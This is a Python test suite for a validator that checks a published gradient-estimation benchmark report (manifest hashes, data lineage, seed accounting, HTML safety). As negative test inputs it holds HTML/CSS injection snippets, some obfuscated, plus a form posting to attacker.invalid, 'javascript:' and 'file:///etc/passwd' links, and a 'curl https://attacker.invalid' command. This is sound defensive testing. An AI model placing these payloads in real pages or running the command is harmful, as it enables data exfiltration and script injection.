from __future__ import annotations

import hashlib
import json
import tempfile
import unittest
from pathlib import Path

from discograd.validate_report import (
    EXPECTED_REFERENCE_CELLS,
    REQUIRED_METHOD_IDS,
    REQUIRED_SECTION_IDS,
    ValidationError,
    validate_publication,
)


RAW_NAMES = (
    "analytic.json",
    "triangle_2d.json",
    "collision_2d.json",
    "path_tracer_gradients.json",
    "path_tracer_optimization.json",
    "contact_3d_gradients.json",
    "contact_3d_optimization.json",
    "opaque_mesh.json",
    "performance.json",
    "references.json",
)
PLOT_NAMES = (
    "analytic_gates.json",
    "gradient_quality.json",
    "bias_variance.json",
    "optimization.json",
    "validity.json",
    "performance.json",
)
FIGURE_NAMES = (
    "analytic_gates.png",
    "triangle_edge_slices.png",
    "collision_2d.png",
    "path_tracer_recovery.png",
    "path_tracer_gradient_quality.png",
    "contact_3d_trajectories.png",
    "contact_3d_gradient_quality.png",
    "opaque_mesh_boundary.png",
    "bias_variance.png",
    "optimization.png",
    "performance.png",
)
IMAGE_NAMES = ("path_target.png", "path_initial.png", "path_recovered.png")
REQUIRED_LITERATURE_URLS = (
    "https://arxiv.org/abs/2109.05143",
    "https://arxiv.org/abs/2310.03585",
    "https://github.com/DiscoGrad/DiscoGrad",
    "https://github.com/a-paulus/softtorch",
    "https://arxiv.org/abs/2603.08824",
)


def write_fixture_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(value, sort_keys=True, allow_nan=False), encoding="utf-8"
    )


def _refresh_manifest(root: Path) -> None:
    manifest_path = root / "data/manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    files = {}
    for path in sorted((*root.glob("data/**/*.json"), *root.glob("assets/**/*.png"))):
        if path == manifest_path:
            continue
        relative = path.relative_to(root).as_posix()
        files[relative] = {
            "sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
            "bytes": path.stat().st_size,
        }
    manifest["files"] = files
    write_fixture_json(manifest_path, manifest)


def make_valid_fixture(test: unittest.TestCase) -> Path:
    temporary = tempfile.TemporaryDirectory()
    test.addCleanup(temporary.cleanup)
    root = Path(temporary.name)
    (root / "data/raw").mkdir(parents=True)
    (root / "data/plot_data").mkdir(parents=True)
    (root / "assets/figures").mkdir(parents=True)
    (root / "assets/images").mkdir(parents=True)

    method_rows = [
        {
            "row_id": f"analytic:{method}",
            "scenario_family": "analytic",
            "method": method,
            "scenario": "step",
            "target": "x",
            "samples": 1,
            "antithetic": False,
            "outer_seed": 0,
            "inner_seed": 0,
            "start_id": "analytic",
            "value": 0.5,
            "gradient": [0.0],
            "reference_gradient": [0.0],
            "relative_error": 0.0,
            "cosine_similarity": 1.0,
            "sign_agreement": 1.0,
            "forward_executions": 1,
            "hard_forward_executions": None,
            "soft_forward_executions": None,
            "backward_executions": 0,
            "independent_contributions": 1,
            "parameter_perturbations": 1,
            "contribution_variance_available": False,
            "gradient_variance_available": False,
            "contribution_variance": None,
            "gradient_variance": None,
            "ci_low": None,
            "ci_high": None,
            "wall_time": 0.01,
            "target_label": "analytic",
            "device": "cpu",
            "source_commit": "1" * 40,
        }
        for method in REQUIRED_METHOD_IDS
    ]
    residual_row = next(
        row for row in method_rows if row["method"] == "residual_control_variate"
    )
    residual_row.update(
        samples=1,
        antithetic=False,
        parameter_perturbations=1,
        hard_forward_executions=1,
        soft_forward_executions=1,
        forward_executions=2,
        backward_executions=1,
        independent_contributions=1,
    )
    for row in method_rows:
        if row["method"] in {
            "crisp_ad",
            "smoothed_pathwise",
            "soft_ad",
            "straight_through_ad",
        }:
            row["backward_executions"] = 1
        elif row["method"] in {"crisp_fd", "smoothed_crn_fd"}:
            row.update(
                forward_executions=3,
                backward_executions=0,
                parameter_perturbations=2,
                independent_contributions=1,
            )
    score_rows = [
        {
            **method_rows[3],
            "row_id": f"path:score:8:{seed}",
            "scenario_family": "path_tracer",
            "samples": 8,
            "outer_seed": seed,
            "scenario": "five_spheres",
            "target": "initial_parameters",
            "antithetic": True,
            "forward_executions": 8,
            "backward_executions": 0,
            "independent_contributions": 4,
            "parameter_perturbations": 8,
            "contribution_variance_available": True,
            "gradient_variance_available": True,
            "contribution_variance": [0.0],
            "gradient_variance": [0.0],
            "ci_low": [0.0],
            "ci_high": [0.0],
        }
        for seed in range(32)
    ]
    raw: dict[str, list[dict[str, object]]] = {name: [] for name in RAW_NAMES}
    raw["analytic.json"] = method_rows
    raw["path_tracer_gradients.json"] = score_rows
    raw["triangle_2d.json"] = [
        {"row_id": "triangle:0", "scenario_family": "triangle_2d"}
    ]
    raw["collision_2d.json"] = [
        {"row_id": "collision:0", "scenario_family": "collision_2d"}
    ]
    raw["contact_3d_gradients.json"] = [
        {"row_id": "contact:0", "scenario_family": "contact_3d"}
    ]
    raw["opaque_mesh.json"] = [
        {
            "row_id": "mesh:0",
            "scenario_family": "opaque_mesh",
            "transform_status": "estimator_only",
            "transformable": False,
        }
    ]
    raw["performance.json"] = [
        {
            "row_id": f"perf:{method}",
            "scenario": "analytic",
            "method": method,
            "wall_time": 0.01,
            "cold_compile_time": 0.02,
            "warm_median": 0.01,
            "warm_iqr": 0.001,
            "warm_repeats": 5,
            "forward_executions": 1,
            "backward_executions": 0,
            "tracemalloc_peak": 1024,
            "tracemalloc_peak_available": True,
            "rss_delta": None,
            "rss_delta_available": False,
            "warp_allocation_peak": None,
            "warp_allocation_peak_available": False,
            "device_free_memory_delta": None,
            "device_free_memory_delta_available": False,
            "device": "cpu",
            "source_commit": "1" * 40,
        }
        for method in REQUIRED_METHOD_IDS
    ]
    reference_rows = []
    for reference_index, cell_id in enumerate(EXPECTED_REFERENCE_CELLS):
        samples = 65536 if cell_id.startswith("contact_3d:") else 32768
        single_stencil = 16 * samples
        offset = 100 + 10 * reference_index
        reference_rows.append(
            {
                "row_id": f"reference:{cell_id}",
                "cell_id": cell_id,
                "parameters": [0.0],
                "sigma": [0.05],
                "h": [0.001],
                "h_half": [0.0005],
                "g_h": [[1.0], [1.0], [1.0], [1.0]],
                "g_h2": [[1.0], [1.0], [1.0], [1.0]],
                "score": [[1.0], [1.0], [1.0], [1.0]],
                "reference_gradient": [1.0],
                "intervals": {
                    name: {
                        "mean": [0.0 if name == "paired_h_minus_h2" else 1.0],
                        "variance": [0.0],
                        "mean_variance": [0.0],
                        "half_width": [0.0],
                        "ci_low": [0.0 if name == "paired_h_minus_h2" else 1.0],
                        "ci_high": [0.0 if name == "paired_h_minus_h2" else 1.0],
                        "replicates": 4,
                        "degrees_of_freedom": 3,
                        "confidence": 0.95,
                    }
                    for name in ("g_h", "g_h2", "score", "paired_h_minus_h2")
                },
                "diagnostics": {
                    "overlap_components": [True],
                    "marginal_step_components": [True],
                    "paired_step_components": [True],
                },
                "accepted": {
                    "references": True,
                    "fd_score_overlap": True,
                    "step_consistency": True,
                    "marginal_step_consistency": True,
                    "paired_step_consistency": True,
                    "replicate_count_sufficient": True,
                    "smoke_only": False,
                },
                "reasons": [],
                "counts": {
                    "samples": samples,
                    "replicates": 4,
                    "h_forward_executions": single_stencil,
                    "h2_forward_executions": single_stencil,
                    "five_point_forward_executions": 2 * single_stencil,
                    "score_forward_executions": 4 * samples,
                    "forward_executions": 2 * single_stencil + 4 * samples,
                },
                "seeds": {
                    "five_point_outer": [offset + index for index in range(4)],
                    "five_point_inner": [
                        536870912 + offset + index for index in range(4)
                    ],
                    "score_outer": [1073741824 + offset + index for index in range(4)],
                    "score_inner": [1610612736 + offset + index for index in range(4)],
                },
                "tier": "report",
                "device": "cpu",
                "source_commit": "1" * 40,
            }
        )
    raw["references.json"] = reference_rows
    for name, rows in raw.items():
        write_fixture_json(
            root / "data/raw" / name,
            {"schema_version": 1, "dataset": name.removesuffix(".json"), "rows": rows},
        )

    plot_source = [row["row_id"] for row in score_rows]
    for name in PLOT_NAMES:
        write_fixture_json(
            root / "data/plot_data" / name,
            {
                "schema_version": 1,
                "dataset": name.removesuffix(".json"),
                "rows": [{"plot_id": name, "source_row_ids": plot_source}],
            },
        )
    method_source_ids = [
        row["row_id"]
        for name in ("analytic.json", "path_tracer_gradients.json")
        for row in raw[name]
    ]
    performance_source_ids = [row["row_id"] for row in raw["performance.json"]]
    validity_source_ids = [
        row["row_id"]
        for name in (
            "triangle_2d.json",
            "collision_2d.json",
            "contact_3d_gradients.json",
            "opaque_mesh.json",
            "references.json",
        )
        for row in raw[name]
    ]
    summary = {
        "schema_version": 1,
        "method_labels": {method: method for method in REQUIRED_METHOD_IDS},
        "scenario_families": [
            "analytic",
            "triangle_2d",
            "collision_2d",
            "path_tracer",
            "contact_3d",
            "opaque_mesh",
        ],
        "literature_urls": list(REQUIRED_LITERATURE_URLS),
        "headline_metrics": {
            "fixture_gradient": {
                "value": 0.0,
                "source_row_ids": [score_rows[0]["row_id"]],
            }
        },
        "method_summaries": [
            {
                "scenario": "fixture",
                "target": "x",
                "method": "score",
                "samples": 8,
                "mean_gradient": [0.0],
                "relative_error": 0.0,
                "cosine_similarity": 1.0,
                "sign_agreement": 1.0,
                "empirical_bias": [0.0],
                "empirical_variance": [0.0],
                "mean_squared_error": [0.0],
                "source_row_ids": method_source_ids,
            }
        ],
        "optimization_summaries": [
            {
                "scenario": "fixture",
                "method": "score",
                "final_hard_loss_mean": 0.0,
                "final_hard_loss_ci_low": 0.0,
                "final_hard_loss_ci_high": 0.0,
                "success_rate": 1.0,
                "held_out_loss_mean": 0.0,
                "source_row_ids": [score_rows[0]["row_id"]],
            }
        ],
        "performance_summaries": [
            {
                "scenario": "fixture",
                "method": "score",
                "cold_compile_time": 0.02,
                "warm_median": 0.01,
                "warm_iqr": 0.001,
                "forward_executions": 1,
                "backward_executions": 0,
                "tracemalloc_peak": 1024,
                "rss_delta": None,
                "warp_allocation_peak": None,
                "device_free_memory_delta": None,
                "source_row_ids": performance_source_ids,
            }
        ],
        "scenario_validity": [
            {
                "scenario": "fixture",
                "accepted": True,
                "metrics": {},
                "source_row_ids": validity_source_ids,
            }
        ],
    }
    write_fixture_json(root / "data/summary.json", summary)
    for name in FIGURE_NAMES:
        (root / "assets/figures" / name).write_bytes(b"fixture-figure")
    for name in IMAGE_NAMES:
        (root / "assets/images" / name).write_bytes(b"fixture-image")

    applicability = [
        {
            "scenario": "analytic",
            "method": method,
            "samples": 1,
            "stochastic": False,
            "antithetic": False,
            "report_required": True,
            "estimator_only": False,
            "applicable": True,
            "transformable": True,
            "optimization_enabled": False,
            "reference_required": False,
            "reason": None,
        }
        for method in REQUIRED_METHOD_IDS
    ]
    applicability.append(
        {
            "scenario": "path_tracer",
            "method": "score",
            "samples": 8,
            "stochastic": True,
            "antithetic": True,
            "report_required": True,
            "estimator_only": False,
            "applicable": True,
            "transformable": True,
            "optimization_enabled": True,
            "reference_required": True,
            "reason": None,
        }
    )
    for scenario in (
        "triangle_2d",
        "collision_2d",
        "path_tracer",
        "contact_3d",
        "opaque_mesh",
    ):
        for method in REQUIRED_METHOD_IDS:
            if (scenario, method) == ("path_tracer", "score"):
                continue
            applicability.append(
                {
                    "scenario": scenario,
                    "method": method,
                    "samples": 1,
                    "stochastic": False,
                    "antithetic": False,
                    "report_required": False,
                    "estimator_only": scenario == "opaque_mesh",
                    "applicable": False,
                    "transformable": False,
                    "optimization_enabled": False,
                    "reference_required": False,
                    "reason": "fixture cell is intentionally unsupported",
                }
            )
    manifest = {
        "schema_version": 1,
        "tier": "report",
        "source": {
            "commit": "1" * 40,
            "dirty": False,
            "command": [
                "uv",
                "run",
                "--extra",
                "examples",
                "-m",
                "warp.examples.optim.example_program_smoothing",
                "--device",
                "cpu",
                "--tier",
                "report",
                "--output-dir",
                "$OUTPUT_DIR",
                "--headless",
            ],
            "python": "3.12",
            "warp": "test",
            "platform": "test",
            "compiler": "test",
            "device": "cpu",
            "cpu_model": "test",
            "cpu_threads": 1,
            "seeds": {"estimator": [0]},
        },
        "config": {
            "smoothing_samples": [8],
            "estimator_seeds": 32,
            "path_reference_samples": 32768,
            "contact_reference_samples": 65536,
            "reference_seed_sets": 4,
        },
        "accepted": {"analytic": True, "references": True, "scenario_validity": True},
        "reference_required_cells": list(EXPECTED_REFERENCE_CELLS),
        "applicability": applicability,
        "files": {},
    }
    write_fixture_json(root / "data/manifest.json", manifest)
    _refresh_manifest(root)

    sections = "".join(
        f'<section id="{item}">{"1" * 40 if item == "reproducibility" else item}</section>'
        for item in REQUIRED_SECTION_IDS
    )
    methods = "".join(
        f'<span data-method="{item}">{item}</span>' for item in REQUIRED_METHOD_IDS
    )
    (root / "index.html").write_text(
        f'<!doctype html><html><body data-source-commit="{"1" * 40}">{sections}{methods}</body></html>',
        encoding="utf-8",
    )
    return root


class PublicationValidationTests(unittest.TestCase):
    def test_valid_fixture_is_accepted(self):
        result = validate_publication(make_valid_fixture(self))
        self.assertEqual(result["files"], 31)
        self.assertGreater(result["rows"], 32)

    def test_missing_manifest_is_rejected(self):
        root = make_valid_fixture(self)
        (root / "data/manifest.json").unlink()
        with self.assertRaisesRegex(ValidationError, "manifest"):
            validate_publication(root)

    def test_missing_or_changed_declared_artifact_is_rejected(self):
        root = make_valid_fixture(self)
        target = root / "assets/images/path_target.png"
        target.unlink()
        with self.assertRaisesRegex(ValidationError, "path_target"):
            validate_publication(root)

        root = make_valid_fixture(self)
        target = root / "data/raw/analytic.json"
        target.write_text(target.read_text(encoding="utf-8") + " ", encoding="utf-8")
        with self.assertRaisesRegex(ValidationError, "analytic.json"):
            validate_publication(root)

    def test_undeclared_artifact_is_rejected(self):
        root = make_valid_fixture(self)
        (root / "assets/figures/secret.png").write_bytes(b"undeclared")
        with self.assertRaisesRegex(ValidationError, "undeclared"):
            validate_publication(root)

    def test_symlinked_root_directory_and_artifact_are_rejected(self):
        root = make_valid_fixture(self)
        link = root.parent / f"{root.name}-link"
        link.symlink_to(root, target_is_directory=True)
        self.addCleanup(link.unlink, missing_ok=True)
        with self.assertRaisesRegex(ValidationError, "symbolic link"):
            validate_publication(link)

        root = make_valid_fixture(self)
        path = root / "assets/images/path_target.png"
        target = root / "path-target-real.png"
        target.write_bytes(path.read_bytes())
        path.unlink()
        path.symlink_to(target)
        with self.assertRaisesRegex(ValidationError, "symlink|symbolic"):
            validate_publication(root)

    def test_missing_required_section_is_rejected(self):
        root = make_valid_fixture(self)
        page = root / "index.html"
        page.write_text(
            page.read_text(encoding="utf-8").replace(
                'id="path-tracing"', 'id="removed"'
            ),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "path-tracing"):
            validate_publication(root)

    def test_missing_method_label_and_legacy_reference_are_rejected(self):
        root = make_valid_fixture(self)
        page = root / "index.html"
        page.write_text(
            page.read_text(encoding="utf-8").replace(
                '<span data-method="score">score</span>',
                '<span data-method="removed"></span>',
            ),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "score"):
            validate_publication(root)

        root = make_valid_fixture(self)
        page = root / "index.html"
        page.write_text(
            page.read_text(encoding="utf-8") + '<img src="triangle_gradients.png">',
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "legacy"):
            validate_publication(root)

    def test_executable_external_and_unmanifested_html_references_are_rejected(self):
        for reference in (
            "javascript:alert(1)",
            "data:text/html,unsafe",
            "file:///etc/passwd",
            "C:/private/image.png",
            "//attacker.invalid/image.png",
        ):
            with self.subTest(reference=reference):
                root = make_valid_fixture(self)
                page = root / "index.html"
                page.write_text(
                    page.read_text(encoding="utf-8")
                    + f'<a href="{reference}">unsafe</a>',
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError, "scheme|reference|filesystem"
                ):
                    validate_publication(root)

        root = make_valid_fixture(self)
        (root / "evil.png").write_bytes(b"not declared")
        page = root / "index.html"
        page.write_text(
            page.read_text(encoding="utf-8") + '<img src="evil.png">', encoding="utf-8"
        )
        with self.assertRaisesRegex(ValidationError, "declared|manifest"):
            validate_publication(root)

    def test_sections_must_be_sections_and_method_labels_must_be_visible(self):
        root = make_valid_fixture(self)
        page = root / "index.html"
        page.write_text(
            page.read_text(encoding="utf-8").replace(
                '<section id="scope">scope</section>', '<div id="scope">scope</div>'
            ),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "scope"):
            validate_publication(root)

        root = make_valid_fixture(self)
        page = root / "index.html"
        page.write_text(
            page.read_text(encoding="utf-8").replace(
                '<span data-method="score">score</span>',
                '<span data-method="score" style="display:none">score</span>',
            ),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "score"):
            validate_publication(root)

        root = make_valid_fixture(self)
        page = root / "index.html"
        page.write_text(
            page.read_text(encoding="utf-8").replace(
                '<section id="scope">scope</section>', '<section id="scope"></section>'
            ),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "scope|empty"):
            validate_publication(root)

    def test_active_html_and_untracked_resource_attributes_are_rejected(self):
        snippets = (
            '<script>alert("unsafe")</script>',
            '<button onclick="alert(1)">unsafe</button>',
            '<img src="assets/images/path_target.png" srcset="evil.png 2x">',
            '<link rel="stylesheet" href="https://attacker.invalid/x.css">',
            '<base href="https://attacker.invalid/">',
            '<meta http-equiv="refresh" content="0;url=https://attacker.invalid">',
            "<style>@import url(https://attacker.invalid/x.css)</style>",
            "<style>body{background:url(evil.png)}</style>",
            r"<style>body{background:u\72l(evil.png)}</style>",
            r'<div style="background:u\72l(evil.png)">x</div>',
            '<style>body{background:image-set("evil.png" 1x)}</style>',
            "<style>body{background:u/**/rl(evil.png)}</style>",
            '<form action="https://attacker.invalid/collect"></form>',
            '<video poster="evil.png"></video>',
            '<a href="https://example.com" ping="https://attacker.invalid/ping">x</a>',
        )
        for snippet in snippets:
            with self.subTest(snippet=snippet):
                root = make_valid_fixture(self)
                page = root / "index.html"
                page.write_text(
                    page.read_text(encoding="utf-8") + snippet, encoding="utf-8"
                )
                with self.assertRaisesRegex(
                    ValidationError, "active|unsafe|attribute|element|filesystem"
                ):
                    validate_publication(root)

    def test_dirty_or_local_source_provenance_is_rejected(self):
        root = make_valid_fixture(self)
        manifest_path = root / "data/manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["source"]["dirty"] = True
        write_fixture_json(manifest_path, manifest)
        with self.assertRaisesRegex(ValidationError, "clean"):
            validate_publication(root)

        root = make_valid_fixture(self)
        manifest = json.loads((root / "data/manifest.json").read_text(encoding="utf-8"))
        manifest["source"]["command"].append("/tmp/private/results")
        write_fixture_json(root / "data/manifest.json", manifest)
        with self.assertRaisesRegex(ValidationError, "local filesystem"):
            validate_publication(root)

    def test_stochastic_coverage_and_work_accounting_are_enforced(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"].pop()
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "32 distinct outer seeds"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["independent_contributions"] = 8
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(
            ValidationError, "independent_contributions|accounting"
        ):
            validate_publication(root)

        root = make_valid_fixture(self)
        manifest_path = root / "data/manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["config"]["smoothing_samples"] = [8, 16]
        write_fixture_json(manifest_path, manifest)
        with self.assertRaisesRegex(ValidationError, "N=16|sample"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["antithetic"] = False
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "antithetic|accounting"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["outer_seed"] = -1
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "outer_seed"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/analytic.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        residual = next(
            row
            for row in payload["rows"]
            if row["method"] == "residual_control_variate"
        )
        residual["parameter_perturbations"] = 999
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(
            ValidationError, "parameter_perturbations|accounting"
        ):
            validate_publication(root)

        root = make_valid_fixture(self)
        manifest_path = root / "data/manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["applicability"].append(dict(manifest["applicability"][0]))
        write_fixture_json(manifest_path, manifest)
        with self.assertRaisesRegex(ValidationError, "duplicate"):
            validate_publication(root)

        root = make_valid_fixture(self)
        manifest = json.loads((root / "data/manifest.json").read_text(encoding="utf-8"))
        manifest["applicability"] = [
            cell
            for cell in manifest["applicability"]
            if not (cell["scenario"] == "contact_3d" and cell["method"] == "score")
        ]
        write_fixture_json(root / "data/manifest.json", manifest)
        with self.assertRaisesRegex(ValidationError, "contact_3d|matrix"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        duplicate = dict(payload["rows"][0])
        duplicate["row_id"] = "path:score:duplicate"
        payload["rows"].append(duplicate)
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "duplicate|32"):
            validate_publication(root)

    def test_performance_rows_are_numerically_validated(self):
        mutations = (
            ("wall_time", -0.1),
            ("forward_executions", -1),
            ("backward_executions", "zero"),
        )
        for field, value in mutations:
            with self.subTest(field=field):
                root = make_valid_fixture(self)
                path = root / "data/raw/performance.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                payload["rows"][0][field] = value
                write_fixture_json(path, payload)
                _refresh_manifest(root)
                with self.assertRaisesRegex(ValidationError, field):
                    validate_publication(root)

        for field in (
            "cold_compile_time",
            "warm_median",
            "warm_iqr",
            "warm_repeats",
            "tracemalloc_peak_available",
            "source_commit",
        ):
            with self.subTest(missing=field):
                root = make_valid_fixture(self)
                path = root / "data/raw/performance.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                del payload["rows"][0][field]
                write_fixture_json(path, payload)
                _refresh_manifest(root)
                with self.assertRaisesRegex(ValidationError, field):
                    validate_publication(root)

    def test_references_lineage_and_opaque_scope_are_enforced(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["accepted"]["references"] = False
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "accepted reference"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/opaque_mesh.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["transform_status"] = "transformed"
        payload["rows"][0]["transformable"] = True
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "estimator-only"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/plot_data/gradient_quality.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["source_row_ids"] = ["missing:row"]
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "missing:row"):
            validate_publication(root)

    def test_reference_dimensions_counts_and_crn_seed_streams_are_enforced(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["g_h"][0] = []
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "dimension|g_h"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["counts"]["forward_executions"] += 1
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "forward"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["seeds"]["score_outer"][0] = 100
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "seed"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/manifest.json"
        manifest = json.loads(path.read_text(encoding="utf-8"))
        manifest["reference_required_cells"] = []
        write_fixture_json(path, manifest)
        with self.assertRaisesRegex(ValidationError, "reference_required_cells"):
            validate_publication(root)

    def test_large_finite_canonical_reference_statistics_do_not_overflow(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = payload["rows"][0]
        large = 1.0e308
        for field in ("g_h", "g_h2", "score"):
            row[field] = [[large], [large], [large], [large]]
            interval = row["intervals"][field]
            interval.update(
                mean=[large],
                variance=[0.0],
                mean_variance=[0.0],
                half_width=[0.0],
                ci_low=[large],
                ci_high=[large],
            )
        row["reference_gradient"] = [large]
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = payload["rows"][0]
        values = [
            7.87073622007493e73,
            7.87073622007494e73,
            7.870736220074919e73,
            7.870736220074938e73,
        ]
        interval = {
            "mean": [7.870736220074931e73],
            "variance": [9.180667443759914e117],
            "mean_variance": [2.2951668609399784e117],
            "half_width": [1.5065044164928034e59],
            "ci_low": [7.870736220074916e73],
            "ci_high": [7.870736220074946e73],
            "replicates": 4,
            "degrees_of_freedom": 3,
            "confidence": 0.95,
        }
        for field in ("g_h", "g_h2", "score"):
            row[field] = [[value] for value in values]
            row["intervals"][field] = dict(interval)
        row["reference_gradient"] = list(interval["mean"])
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        validate_publication(root)

    def test_rejected_rows_cannot_feed_summary_or_headline_aggregates(self):
        root = make_valid_fixture(self)
        raw_path = root / "data/raw/triangle_2d.json"
        raw = json.loads(raw_path.read_text(encoding="utf-8"))
        raw["rows"][0]["accepted"] = False
        write_fixture_json(raw_path, raw)
        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        summary["method_summaries"][0]["source_row_ids"] = ["triangle:0"]
        write_fixture_json(summary_path, summary)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "rejected"):
            validate_publication(root)

        root = make_valid_fixture(self)
        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        summary["headline_metrics"] = {
            "best": {"value": 1.0, "source_row_ids": ["missing"]}
        }
        write_fixture_json(summary_path, summary)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "missing|unknown"):
            validate_publication(root)

    def test_duplicate_or_orphaned_lineage_and_empty_summaries_are_rejected(self):
        root = make_valid_fixture(self)
        path = root / "data/plot_data/gradient_quality.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["source_row_ids"].append(
            payload["rows"][0]["source_row_ids"][0]
        )
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "duplicate"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/triangle_2d.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"].append(
            {"row_id": "triangle:orphan", "scenario_family": "triangle_2d"}
        )
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "orphan|lineage"):
            validate_publication(root)

        for collection in (
            "headline_metrics",
            "method_summaries",
            "optimization_summaries",
            "performance_summaries",
            "scenario_validity",
        ):
            with self.subTest(collection=collection):
                root = make_valid_fixture(self)
                path = root / "data/summary.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                payload[collection] = {}
                if collection != "headline_metrics":
                    payload[collection] = []
                write_fixture_json(path, payload)
                _refresh_manifest(root)
                with self.assertRaisesRegex(ValidationError, collection):
                    validate_publication(root)

    def test_nonfinite_json_and_missing_literature_are_rejected(self):
        root = make_valid_fixture(self)
        path = root / "data/summary.json"
        path.write_text(
            path.read_text(encoding="utf-8").replace('"value": 0.0', '"value": NaN', 1),
            encoding="utf-8",
        )
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "non-finite"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/summary.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["literature_urls"].remove("https://arxiv.org/abs/2109.05143")
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "2109.05143"):
            validate_publication(root)

    def test_canonical_producer_commit_and_absolute_path_provenance_are_enforced(self):
        root = make_valid_fixture(self)
        manifest_path = root / "data/manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["source"]["command"] = [
            "curl",
            "https://attacker.invalid",
            "$OUTPUT_DIR",
        ]
        write_fixture_json(manifest_path, manifest)
        with self.assertRaisesRegex(ValidationError, "canonical|producer"):
            validate_publication(root)

        for leaked in ("/etc/passwd", "C:/private/results"):
            with self.subTest(leaked=leaked):
                root = make_valid_fixture(self)
                manifest = json.loads(
                    (root / "data/manifest.json").read_text(encoding="utf-8")
                )
                manifest["source"]["platform"] = leaked
                write_fixture_json(root / "data/manifest.json", manifest)
                with self.assertRaisesRegex(ValidationError, "local filesystem"):
                    validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/analytic.json"
